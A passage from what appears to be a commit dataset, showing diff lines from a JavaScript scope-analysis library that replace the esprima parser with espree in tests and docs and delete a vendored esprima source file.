{ break q; } }"");<\n>-        const ast = espree(`<\n>-const espree = require(""./util/espree"");<\n>-        const ast = espree(`<\n>-            ""use strict"";<\n>-        const ast = espree(`<\n>-            import {x as v} from ""mod"";`<\n>-    it(""doesn\'t require property type""<c> function() {<\n>-        // Hardcoded AST.  Escope adds an extra ""Property""<\n>-const espree = require(""./util/espree"");<\n>-        const ast = espree(`<\n>-        const ast = espree(`<\n>-        `<c> ""script"");<\n>-const espree = require(""./util/espree"");<\n>-const espree = require(""./util/espree"");<\n>-        const ast = espree(`<\n>-        `<c> ""script"");<\n>-""use strict"";<\n>-var espree = require(""espree"");<\n>-module.exports = function(code<c> sourceType) {<\n>-    sourceType = sourceType || ""module"";<\n>-        sourceType: sourceType<\n>",F
17,56,56,569,4,26,Corbin Uselton,70,3,24,3,User,1,3149,Wed,10,22,22 Feb 2017,Chore: Remove es6-map and es6-weakmap as they are included in node4 (#10) (#13),1,0,42,4992,201405,"+    TEST_FILES = ""test/*.js"";<\n>+var espree = require('espree');<\n>+var ast = espree.parse(code);<\n>+         * @member {espree.Identifier} Definition#name - the identifier AST node of the occurrence.<\n>+         * @member {espree.Node} Definition#node - the enclosing node of the identifier.<\n>+         * @member {espree.Node?} Definition#parent - the enclosing statement node of the identifier.<\n>+ * Mozilla Parser API</a>. E.g. <a href=""https://github.com/eslint/espree"">espree</a> is a parser<\n>+ * Main interface function. Takes an Espree syntax tree and returns the<\n>+ * @param {espree.Tree} tree - Abstract Syntax Tree<\n>+    // But espree 2.0 parses to ArrayExpression<c> ObjectExpression<c> etc...<\n>+         * @member {espreeIdentifier} Reference#identifier<\n>+             * @member {espreeNode} Reference#writeExpr<\n>+     * @param {Espree.Node} node - a node to get.<\n>+     * @param {Espree.Node} node - node for the acquired scope.<\n>+     * @param {Espree.Node} node - node for the acquired scope.<\n>+     * @param {Espree.Node} node - releasing node.<\n>+         * @member {espree.Node} Scope#block<\n>+     * @param {Espree.Identifier} ident - identifier to be resolved.<\n>+         * @member {espree.Identifier[]} Variable#identifiers<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+        const ast = espree(""var arrow = (a<c> b<c> c<c> d) => {}"");<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+        expect(scope.variables).to.have.length(4);<\n>+        expect(scope.variables[0].name).to.be.equal(""a"");<\n>+        expect(scope.variables[1].name).to.be.equal(""b"");<\n>+        expect(scope.variables[2].name).to.be.equal(""c"");<\n>+        expect(scope.variables[3].name).to.be.equal(""d"");<\n>+        expect(scope.references).to.have.length(0);<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+const espree = require(""./util/espree"");<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        let ast = espree(`<\n>+        ast = espree(`<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        let ast = espree(`<\n>+        ast = espree(`<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        expect(scope.variables[3].defs[0].rest).to.be.true;<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(""export var v;"");<\n>+        const ast = espree(""export default function f(){};"");<\n>+        const ast = espree(""export default function(){};"");<\n>+        const ast = espree(""export default 42;"");<\n>+        const ast = espree(""export {x};"");<\n>+        const ast = espree(""export {v as x};"");<\n>+        const ast = espree(""export {x} from \""mod\"";"");<\n>+        const ast = espree(""export {v as x} from \""mod\"";"");<\n>+        const ast = espree(""export * from \""mod\"";"");<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(""import v from \""mod\"";"");<\n>+        const ast = espree(""import * as ns from \""mod\"";"");<\n>+        const ast = espree(""import {x} from \""mod\"";"");<\n>+        const ast = espree(""import {x as v} from \""mod\"";"");<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+const espree = require(""./util/espree"");<\n>+    it(""materialize rest argument in scope""<c> function() {<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        analyze(ast); // default is `fallback: ""iteration""`<\n>+        const ast = espree(`<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+const espree = require(""./util/espree"");<\n>+    /* eslint-disable require-jsdoc */<\n>+            [""A""<c> ""A""]<c> // outer scope""s and inner scope""s.<\n>+            import b<c> {c<c> x as d} from ""ccc"";`<\n>+            import b<c> {c<c> x as d} from ""ccc"";`<\n>+            import b<c> {c<c> x as d} from ""ccc"";`<\n>+            import b<c> {c<c> x as d} from ""ccc"";`<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(""b++;"");<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+    it(""assignment doesn\'t leak""<c> function() {<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+    it(""for-in-statement doesn\'t leaks""<c> function() {<\n>+        const ast = espree(`<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+                    ""use strict"";<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+            function foo() {}`<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(""function bar() { q: for(;;) { break q; } }"");<\n>+        const ast = espree(`<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+            ""use strict"";<\n>+        const ast = espree(`<\n>+            import {x as v} from ""mod"";`<\n>+    it(""doesn\'t require property type""<c> function() {<\n>+        // Hardcoded AST.  Escope adds an extra ""Property""<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+        const ast = espree(`<\n>+        `<c> ""script"");<\n>+const espree = require(""./util/espree"");<\n>+""use strict"";<\n>+var espree = require(""espree"");<\n>+module.exports = function(code<c> sourceType) {<\n>+    sourceType = sourceType || ""module"";<\n>+    return espree.parse(code<c> {<\n>+        sourceType: sourceType<\n>+const espree = require(""./util/espree"");<\n>+        const ast = espree(`<\n>+        `<c> ""script"");<\n>","-esprima.js<\n>-    TEST_FILES = ""test/**/*.js"";<\n>-var esprima = require('esprima');<\n>-var ast = esprima.parse(code);<\n>-        <\n>-        <\n>-    ""esprima"": ""^2.7.1""<c><\n>-         * @member {esprima.Identifier} Definition#name - the identifier AST node of the occurrence.<\n>-         * @member {esprima.Node} Definition#node - the enclosing node of the identifier.<\n>-         * @member {esprima.Node?} Definition#parent - the enclosing statement node of the identifier.<\n>- * Mozilla Parser API</a>. E.g. <a href=""http://esprima.org"">esprima</a> is a parser<\n>- * Main interface function. Takes an Esprima syntax tree and returns the<\n>- * @param {esprima.Tree} tree - Abstract Syntax Tree<\n>-    // But espree 2.0 and esprima 2.0 parse to ArrayExpression<c> ObjectExpression<c> etc...<\n>-         * @member {esprima#Identifier} Reference#identifier<\n>-             * @member {esprima#Node} Reference#writeExpr<\n>-     * @param {Esprima.Node} node - a node to get.<\n>-     * @param {Esprima.Node} node - node for the acquired scope.<\n>-     * @param {Esprima.Node} node - node for the acquired scope.<\n>-     * @param {Esprima.Node} node - releasing node.<\n>-         * @member {esprima.Node} Scope#block<\n>-     * @param {Esprima.Identifier} ident - identifier to be resolved.<\n>-         * @member {esprima.Identifier[]} Variable#identifiers<\n>-const esprima = require(""esprima"");<\n>-        const ast = esprima.parse(`<\n>-const esprima = require(""esprima"");<\n>-        const ast = esprima.parse(`<\n>-const esprima = require(""esprima"");<\n>-        const ast = esprima.parse(`<\n>-        const ast = esprima.parse(`<\n>-        const ast = esprima.parse(`<\n>-const parse = require(""../third_party/esprima"").parse;<\n>-        const ast = parse(`<\n>-        const ast = parse(""var arrow = (a<c> b<c> c<c> d) => {}"");<\n>-const parse = require(""../third_party/esprima"").parse;<\n>-        const ast = parse(`<\n>-        const ast = parse(`<\n>-        const ast = parse(`<\n>-        const ast = parse(`<\n>-        const ast = parse(`<\n>-const parse = require(""../third_party/esprima"").parse;<\n>-        const ast = parse(`<\n>-        // FIXME After Esprima's bug is fixed<c> I'll add tests #33<\n>-        // https://github.com/estools/escope/issues/33#issuecomment-64135832<\n>-        //<\n>-        // expect(scope.variables).to.have.length(4);<\n>-        // expect(scope.variables[0].name).to.be.equal('a');<\n>-        // expect(scope.variables[1].name).to.be.equal('b');<\n>-        // expect(scope.variables[2].name).to.be.equal('c');<\n>-        // expect(scope.variables[3].name).to.be.equal('d');<\n>-        // expect(scope.references).to.have.length(0);<\n>-const parse = require(""../third_party/esprima"").parse;<\n>-        const ast = parse(`<\n>-        const ast = parse(`<\n>-        const ast = parse(`<\n>-        const ast = parse(`<\n>-        const ast = parse(`<\n>-const espree = require(""../third_party/espree"");<\n>-const harmony = require(""../third_party/esprima"");<\n>-const espree = require(""../third_party/espree"");<\n>-        const ast = harmony.parse(`<\n>-        const ast = harmony.parse(`<\n>-        const ast = harmony.parse(`<\n>-        let ast = harmony.parse(`<\n>-        ast = harmony.parse(`<\n>-        const ast = harmony.parse(`<\n>-        const ast = harmony.parse(`<\n>-        const ast = harmony.parse(`<\n>-        const ast = harmony.parse(`<\n>-        let ast = harmony.parse(`<\n>-        ast = harmony.parse(`<\n>-        const ast = harmony.parse(`<\n>-        const ast = harmony.parse(`<\n>-        const ast = harmony.parse(`<\n>-        const ast = harmony.parse(`<\n>-        const ast = harmony.parse(`<\n>-        expect(scope.variables[3].defs[0].rest).to.be.false;<\n>-        // ast = espree.parse(`<\n>-        //     (function ([a<c> b<c> ...[c<c> d<c> ...rest]]) {<\n>-        //     }(array));<\n>-        // `);<\n>-        // scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-        // expect(scopeManager.scopes).to.have.length(2);<\n>-        // scope = scopeManager.scopes[0];<\n>-        // expect(scope.type).to.be.equal('global');<\n>-        // expect(scope.variables).to.have.length(0);<\n>-        // expect(scope.references).to.have.length(0);<\n>-        // expect(scope.implicit.left).to.have.length(1);<\n>-        // expect(scope.implicit.left[0].identifier.name).to.be.equal('array');<\n>-        // scope = scopeManager.scopes[1];<\n>-        // expect(scope.type).to.be.equal('function');<\n>-        // expect(scope.variables).to.have.length(6);<\n>-        // const expectedVariableNames = [<\n>-        //     'arguments'<\n>-        //     'a'<\n>-        //     'b'<\n>-        //     'c'<\n>-        //     'd'<\n>-        //     'rest'<\n>-        // ];<\n>-        // for (let index = 0; index < expectedVariableNames.length; index++) {<\n>-        //     expect(scope.variables[index].name).to.be.equal(expectedVariableNames[index]);<\n>-        // }<\n>-        // expect(scope.references).to.have.length(6);<\n>-        // const expectedReferenceNames = [<\n>-        //         'a'<\n>-        //         'b'<\n>-        //         'c'<\n>-        //         'd'<\n>-        //         'rest'<\n>-        //     ]<\n>-        // for (let index = 0; index < expectedReferenceNames.length; index++) {<\n>-        //     expect(scope.references[index].identifier.name).to.be.equal(expectedReferenceNames[index]);<\n>-        //     expect(scope.references[index].isWrite()).to.be.true<\n>-        //     expect(scope.references[index].partial).to.be.true<\n>-        // }<\n>-        // expect(scope.references[5].identifier.name).to.be.equal('array');<\n>-        // expect(scope.references[5].isWrite()).to.be.false;<\n>-        const ast = harmony.parse(`<\n>-        const ast = harmony.parse(`<\n>-const espree = require(""../third_party/espree"");<\n>-        const ast = espree(""export var v;""<c> {sourceType: ""module""});<\n>-        const ast = espree(""export default function f(){};""<c> {sourceType: ""module""});<\n>-        const ast = espree(""export default function(){};""<c> {sourceType: ""module""});<\n>-        const ast = espree(""export default 42;""<c> {sourceType: ""module""});<\n>-        const ast = espree(""export {x};""<c> {sourceType: ""module""});<\n>-        const ast = espree(""export {v as x};""<c> {sourceType: ""module""});<\n>-        const ast = espree(""export {x} from \""mod\"";""<c> {sourceType: ""module""});<\n>-        const ast = espree(""export {v as x} from \""mod\"";""<c> {sourceType: ""module""});<\n>-        const ast = espree(""export * from \""mod\"";""<c> {sourceType: ""module""});<\n>-const espree = require(""../third_party/espree"");<\n>-        const ast = espree(""import v from \""mod\"";""<c> {sourceType: ""module""});<\n>-        const ast = espree( ""import * as ns from \""mod\"";""<c> {sourceType: ""module""<\n>-        });<\n>-        const ast = espree(""import {x} from \""mod\"";""<c> {sourceType: ""module""<\n>-        });<\n>-        const ast = espree(""import {x as v} from \""mod\"";""<c> {sourceType: ""module""});<\n>-const parse = require(""../third_party/esprima"").parse;<\n>-        const ast = parse(`<\n>-        const ast = parse(`<\n>-        const ast = parse(`<\n>-const parse = require(""../third_party/espree"");<\n>-        const ast = parse(`<\n>-const parse = require(""../third_party/esprima"").parse;<\n>-        const ast = parse(`<\n>-        const ast = parse(`<\n>-const esprima = require(""../third_party/esprima"").parse;<\n>-const espree = require(""../third_party/espree"");<\n>-    it(""materialize rest argument in scope (esprima: rest property of FunctionDeclaration)""<c> function() {<\n>-        const ast = esprima(`<\n>-            function foo(...bar) {<\n>-                return bar;<\n>-            }<\n>-        `);<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-        expect(scopeManager.scopes).to.have.length(2);<\n>-        let scope = scopeManager.scopes[0];<\n>-        expect(scope.type).to.be.equal(""global"");<\n>-        expect(scope.block.type).to.be.equal(""Program"");<\n>-        expect(scope.isStrict).to.be.false;<\n>-        expect(scope.variables).to.have.length(1);<\n>-        scope = scopeManager.scopes[1];<\n>-        expect(scope.type).to.be.equal(""function"");<\n>-        expect(scope.variables).to.have.length(2);<\n>-        expect(scope.variables[0].name).to.be.equal(""arguments"");<\n>-        expect(scope.variables[1].name).to.be.equal(""bar"");<\n>-        expect(scope.variables[1].defs[0].name.name).to.be.equal(""bar"");<\n>-        expect(scope.variables[1].defs[0].rest).to.be.true;<\n>-    });<\n>-    it(""materialize rest argument in scope (espree: RestElement)""<c> function() {<\n>-const parse = require(""../third_party/esprima"").parse;<\n>-        const ast = parse(`<\n>-const parse = require(""../third_party/esprima"").parse;<\n>-        const ast = parse(`<\n>-const parse = require(""../third_party/esprima"").parse;<\n>-        const ast = parse(`<\n>-const esprima = require(""../third_party/esprima"");<\n>-        const ast = esprima.parse(`<\n>-        const ast = esprima.parse(`<\n>-        analyze(ast); // default is `fallback: 'iteration'`<\n>-        const ast = esprima.parse(`<\n>-const parse = require(""../third_party/esprima"").parse;<\n>-        const ast = parse(`<\n>-const espree = require(""../third_party/espree"");<\n>-    /**<\n>-     * Verify<\n>-     * @param {AST} ast - Abstract syntax tree<\n>-     * @param {string} type - type<\n>-     * @param {array} expectedNamesList - expected names<\n>-     * @returns {void}<\n>-     */<\n>-            [""A""<c> ""A""]<c> // outer scope's and inner scope's.<\n>-            import b<c> {c<c> x as d} from ""ccc"";`<c><\n>-            {sourceType: ""module""}<\n>-            import b<c> {c<c> x as d} from ""ccc"";`<c><\n>-            {sourceType: ""module""}<\n>-            import b<c> {c<c> x as d} from ""ccc"";`<c><\n>-            {sourceType: ""module""}<\n>-            import b<c> {c<c> x as d} from ""ccc"";`<c><\n>-            {sourceType: ""module""}<\n>-const parse = require(""../third_party/esprima"").parse;<\n>-        const ast = parse(""b++;"");<\n>-const parse = require(""../third_party/esprima"").parse;<\n>-        const ast = parse(`<\n>-        const ast = parse(`<\n>-        const ast = parse(`<\n>-        const ast = parse(`<\n>-    it(""assignment doesn't leak""<c> function() {<\n>-        const ast = parse(`<\n>-        const ast = parse(`<\n>-    it(""for-in-statement doesn't leaks""<c> function() {<\n>-        const ast = parse(`<\n>-const parse = require(""../third_party/esprima"").parse;<\n>-        const ast = parse(`<\n>-                    'use strict';<\n>-        const ast = parse(`<\n>-        const ast = parse(`<\n>-        const ast = parse(`<\n>-            function foo() {}`<c><\n>-            {sourceType: ""module""}<\n>-const parse = require(""../third_party/esprima"").parse;<\n>-        const ast = parse(""function bar() { q: for(;;) { break q; } }"");<\n>-        const ast = parse(`<\n>-const parse = require(""../third_party/esprima"").parse;<\n>-        const ast = parse(`<\n>-            'use strict';<\n>-        const ast = parse(`<\n>-            import {x as v} from ""mod"";`<c><\n>-            {sourceType: ""module"" }<\n>-    it(""doesn't require property type""<c> function() {<\n>-        // Hardcoded AST.  Esprima adds an extra 'Property'<\n>-const parse = require(""../third_party/esprima"").parse;<\n>-        const ast = parse(`<\n>-        const ast = parse(`<\n>-        `);<\n>-const espree = require(""../third_party/espree"");<\n>-var espree = require('espree');<\n>-module.exports = function (code) {<\n>-    return espree.parse(code<c> {<\n>-        // attach range information to each node<\n>-        range: true<c><\n>-        // attach line/column location information to each node<\n>-        loc: true<c><\n>-        // create a top-level comments array containing all comments<\n>-        comments: true<c><\n>-        // attach comments to the closest relevant node as leadingComments and<\n>-        // trailingComments<\n>-        attachComment: true<c><\n>-        // create a top-level tokens array containing all tokens<\n>-        tokens: true<c><\n>-        // try to continue parsing if an error is encountered<c> store errors in a<\n>-        // top-level errors array<\n>-        tolerant: true<c><\n>-        ecmaVersion: 6<c><\n>-        sourceType: ""module""<\n>-const parse = require(""../third_party/esprima"").parse;<\n>-        const ast = parse(`<\n>-        `);<\n>-/*<\n>-  Copyright (C) 2013 Ariya Hidayat <ariya.hidayat@gmail.com><\n>-  Copyright (C) 2013 Thaddee Tyl <thaddee.tyl@gmail.com><\n>-  Copyright (C) 2012 Ariya Hidayat <ariya.hidayat@gmail.com><\n>-  Copyright (C) 2012 Mathias Bynens <mathias@qiwi.be><\n>-  Copyright (C) 2012 Joost-Wim Boekesteijn <joost-wim@boekesteijn.nl><\n>-  Copyright (C) 2012 Kris Kowal <kris.kowal@cixar.com><\n>-  Copyright (C) 2012 Yusuke Suzuki <utatane.tea@gmail.com><\n>-  Copyright (C) 2012 Arpad Borsos <arpad.borsos@googlemail.com><\n>-  Copyright (C) 2011 Ariya Hidayat <ariya.hidayat@gmail.com><\n>-  Redistribution and use in source and binary forms<c> with or without<\n>-  modification<c> are permitted provided that the following conditions are met:<\n>-    * Redistributions of source code must retain the above copyright<\n>-      notice<c> this list of conditions and the following disclaimer.<\n>-    * Redistributions in binary form must reproduce the above copyright<\n>-      notice<c> this list of conditions and the following disclaimer in the<\n>-      documentation and/or other materials provided with the distribution.<\n>-  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>-  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>-  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>-  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>-  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>-  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>-  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>-  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>-  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>-  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>-*/<\n>-/*jslint bitwise:true plusplus:true */<\n>-/*global esprima:true<c> define:true<c> exports:true<c> window: true<c><\n>-throwError: true<c> generateStatement: true<c> peek: true<c><\n>-parseAssignmentExpression: true<c> parseBlock: true<c><\n>-parseClassExpression: true<c> parseClassDeclaration: true<c> parseExpression: true<c><\n>-parseForStatement: true<c><\n>-parseFunctionDeclaration: true<c> parseFunctionExpression: true<c><\n>-parseFunctionSourceElements: true<c> parseVariableIdentifier: true<c><\n>-parseImportSpecifier: true<c><\n>-parseLeftHandSideExpression: true<c> parseParams: true<c> validateParam: true<c><\n>-parseSpreadOrAssignmentExpression: true<c><\n>-parseStatement: true<c> parseSourceElement: true<c> parseConciseBody: true<c><\n>-parseYieldExpression: true<\n>-*/<\n>-(function (root<c> factory) {<\n>-    'use strict';<\n>-    // Universal Module Definition (UMD) to support AMD<c> CommonJS/Node.js<c><\n>-    // Rhino<c> and plain browser loading.<\n>-    /* istanbul ignore next */<\n>-    if (typeof define === 'function' && define.amd) {<\n>-        define(['exports']<c> factory);<\n>-    } else if (typeof exports !== 'undefined') {<\n>-        factory(exports);<\n>-    } else {<\n>-        factory((root.esprima = {}));<\n>-    }<\n>-    'use strict';<\n>-    var Token<c><\n>-        TokenName<c><\n>-        FnExprTokens<c><\n>-        Syntax<c><\n>-        PropertyKind<c><\n>-        Messages<c><\n>-        Regex<c><\n>-        SyntaxTreeDelegate<c><\n>-        ClassPropertyType<c><\n>-        source<c><\n>-        strict<c><\n>-        index<c><\n>-        lineNumber<c><\n>-        lineStart<c><\n>-        length<c><\n>-        delegate<c><\n>-        lookahead<c><\n>-        state<c><\n>-        extra;<\n>-    Token = {<\n>-        BooleanLiteral: 1<c><\n>-        EOF: 2<c><\n>-        Identifier: 3<c><\n>-        Keyword: 4<c><\n>-        NullLiteral: 5<c><\n>-        NumericLiteral: 6<c><\n>-        Punctuator: 7<c><\n>-        StringLiteral: 8<c><\n>-        RegularExpression: 9<c><\n>-        Template: 10<\n>-    };<\n>-    TokenName = {};<\n>-    TokenName[Token.BooleanLiteral] = 'Boolean';<\n>-    TokenName[Token.EOF] = '<end>';<\n>-    TokenName[Token.Identifier] = 'Identifier';<\n>-    TokenName[Token.Keyword] = 'Keyword';<\n>-    TokenName[Token.NullLiteral] = 'Null';<\n>-    TokenName[Token.NumericLiteral] = 'Numeric';<\n>-    TokenName[Token.Punctuator] = 'Punctuator';<\n>-    TokenName[Token.StringLiteral] = 'String';<\n>-    TokenName[Token.RegularExpression] = 'RegularExpression';<\n>-    // A function following one of those tokens is an expression.<\n>-    FnExprTokens = ['('<c> '{'<c> '['<c> 'in'<c> 'typeof'<c> 'instanceof'<c> 'new'<c><\n>-                    'return'<c> 'case'<c> 'delete'<c> 'throw'<c> 'void'<c><\n>-                    // assignment operators<\n>-                    '='<c> '+='<c> '-='<c> '*='<c> '/='<c> '%='<c> '<<='<c> '>>='<c> '>>>='<c><\n>-                    '&='<c> '|='<c> '^='<c> '<c>'<c><\n>-                    // binary/unary operators<\n>-                    '+'<c> '-'<c> '*'<c> '/'<c> '%'<c> '++'<c> '--'<c> '<<'<c> '>>'<c> '>>>'<c> '&'<c><\n>-                    '|'<c> '^'<c> '!'<c> '~'<c> '&&'<c> '||'<c> '?'<c> ':'<c> '==='<c> '=='<c> '>='<c><\n>-                    '<='<c> '<'<c> '>'<c> '!='<c> '!=='];<\n>-    Syntax = {<\n>-        ArrayExpression: 'ArrayExpression'<c><\n>-        ArrayPattern: 'ArrayPattern'<c><\n>-        ArrowFunctionExpression: 'ArrowFunctionExpression'<c><\n>-        AssignmentExpression: 'AssignmentExpression'<c><\n>-        BinaryExpression: 'BinaryExpression'<c><\n>-        BlockStatement: 'BlockStatement'<c><\n>-        BreakStatement: 'BreakStatement'<c><\n>-        CallExpression: 'CallExpression'<c><\n>-        CatchClause: 'CatchClause'<c><\n>-        ClassBody: 'ClassBody'<c><\n>-        ClassDeclaration: 'ClassDeclaration'<c><\n>-        ClassExpression: 'ClassExpression'<c><\n>-        ComprehensionBlock: 'ComprehensionBlock'<c><\n>-        ComprehensionExpression: 'ComprehensionExpression'<c><\n>-        ConditionalExpression: 'ConditionalExpression'<c><\n>-        ContinueStatement: 'ContinueStatement'<c><\n>-        DebuggerStatement: 'DebuggerStatement'<c><\n>-        DoWhileStatement: 'DoWhileStatement'<c><\n>-        EmptyStatement: 'EmptyStatement'<c><\n>-        ExportDeclaration: 'ExportDeclaration'<c><\n>-        ExportBatchSpecifier: 'ExportBatchSpecifier'<c><\n>-        ExportSpecifier: 'ExportSpecifier'<c><\n>-        ExpressionStatement: 'ExpressionStatement'<c><\n>-        ForInStatement: 'ForInStatement'<c><\n>-        ForOfStatement: 'ForOfStatement'<c><\n>-        ForStatement: 'ForStatement'<c><\n>-        FunctionDeclaration: 'FunctionDeclaration'<c><\n>-        FunctionExpression: 'FunctionExpression'<c><\n>-        Identifier: 'Identifier'<c><\n>-        IfStatement: 'IfStatement'<c><\n>-        ImportDeclaration: 'ImportDeclaration'<c><\n>-        ImportDefaultSpecifier: 'ImportDefaultSpecifier'<c><\n>-        ImportNamespaceSpecifier: 'ImportNamespaceSpecifier'<c><\n>-        ImportSpecifier: 'ImportSpecifier'<c><\n>-        LabeledStatement: 'LabeledStatement'<c><\n>-        Literal: 'Literal'<c><\n>-        LogicalExpression: 'LogicalExpression'<c><\n>-        MemberExpression: 'MemberExpression'<c><\n>-        MethodDefinition: 'MethodDefinition'<c><\n>-        ModuleSpecifier: 'ModuleSpecifier'<c><\n>-        NewExpression: 'NewExpression'<c><\n>-        ObjectExpression: 'ObjectExpression'<c><\n>-        ObjectPattern: 'ObjectPattern'<c><\n>-        Program: 'Program'<c><\n>-        Property: 'Property'<c><\n>-        ReturnStatement: 'ReturnStatement'<c><\n>-        SequenceExpression: 'SequenceExpression'<c><\n>-        SpreadElement: 'SpreadElement'<c><\n>-        SwitchCase: 'SwitchCase'<c><\n>-        SwitchStatement: 'SwitchStatement'<c><\n>-        TaggedTemplateExpression: 'TaggedTemplateExpression'<c><\n>-        TemplateElement: 'TemplateElement'<c><\n>-        TemplateLiteral: 'TemplateLiteral'<c><\n>-        ThisExpression: 'ThisExpression'<c><\n>-        ThrowStatement: 'ThrowStatement'<c><\n>-        TryStatement: 'TryStatement'<c><\n>-        UnaryExpression: 'UnaryExpression'<c><\n>-        UpdateExpression: 'UpdateExpression'<c><\n>-        VariableDeclaration: 'VariableDeclaration'<c><\n>-        VariableDeclarator: 'VariableDeclarator'<c><\n>-        WhileStatement: 'WhileStatement'<c><\n>-        WithStatement: 'WithStatement'<c><\n>-        YieldExpression: 'YieldExpression'<\n>-    };<\n>-    PropertyKind = {<\n>-        Data: 1<c><\n>-        Get: 2<c><\n>-        Set: 4<\n>-    };<\n>-    ClassPropertyType = {<\n>-        'static': 'static'<c><\n>-        prototype: 'prototype'<\n>-    };<\n>-    // Error messages should be identical to V8.<\n>-    Messages = {<\n>-        UnexpectedToken:  'Unexpected token %0'<c><\n>-        UnexpectedNumber:  'Unexpected number'<c><\n>-        UnexpectedString:  'Unexpected string'<c><\n>-        UnexpectedIdentifier:  'Unexpected identifier'<c><\n>-        UnexpectedReserved:  'Unexpected reserved word'<c><\n>-        UnexpectedTemplate:  'Unexpected quasi %0'<c><\n>-        UnexpectedEOS:  'Unexpected end of input'<c><\n>-        NewlineAfterThrow:  'Illegal newline after throw'<c><\n>-        InvalidRegExp: 'Invalid regular expression'<c><\n>-        UnterminatedRegExp:  'Invalid regular expression: missing /'<c><\n>-        InvalidLHSInAssignment:  'Invalid left-hand side in assignment'<c><\n>-        InvalidLHSInFormalsList:  'Invalid left-hand side in formals list'<c><\n>-        InvalidLHSInForIn:  'Invalid left-hand side in for-in'<c><\n>-        MultipleDefaultsInSwitch: 'More than one default clause in switch statement'<c><\n>-        NoCatchOrFinally:  'Missing catch or finally after try'<c><\n>-        UnknownLabel: 'Undefined label \'%0\''<c><\n>-        Redeclaration: '%0 \'%1\' has already been declared'<c><\n>-        IllegalContinue: 'Illegal continue statement'<c><\n>-        IllegalBreak: 'Illegal break statement'<c><\n>-        IllegalDuplicateClassProperty: 'Illegal duplicate property in class definition'<c><\n>-        IllegalReturn: 'Illegal return statement'<c><\n>-        IllegalYield: 'Illegal yield expression'<c><\n>-        IllegalSpread: 'Illegal spread element'<c><\n>-        StrictModeWith:  'Strict mode code may not include a with statement'<c><\n>-        StrictCatchVariable:  'Catch variable may not be eval or arguments in strict mode'<c><\n>-        StrictVarName:  'Variable name may not be eval or arguments in strict mode'<c><\n>-        StrictParamName:  'Parameter name eval or arguments is not allowed in strict mode'<c><\n>-        StrictParamDupe: 'Strict mode function may not have duplicate parameter names'<c><\n>-        ParameterAfterRestParameter: 'Rest parameter must be final parameter of an argument list'<c><\n>-        DefaultRestParameter: 'Rest parameter can not have a default value'<c><\n>-        ElementAfterSpreadElement: 'Spread must be the final element of an element list'<c><\n>-        ObjectPatternAsRestParameter: 'Invalid rest parameter'<c><\n>-        ObjectPatternAsSpread: 'Invalid spread argument'<c><\n>-        StrictFunctionName:  'Function name may not be eval or arguments in strict mode'<c><\n>-        StrictOctalLiteral:  'Octal literals are not allowed in strict mode.'<c><\n>-        StrictDelete:  'Delete of an unqualified identifier in strict mode.'<c><\n>-        StrictDuplicateProperty:  'Duplicate data property in object literal not allowed in strict mode'<c><\n>-     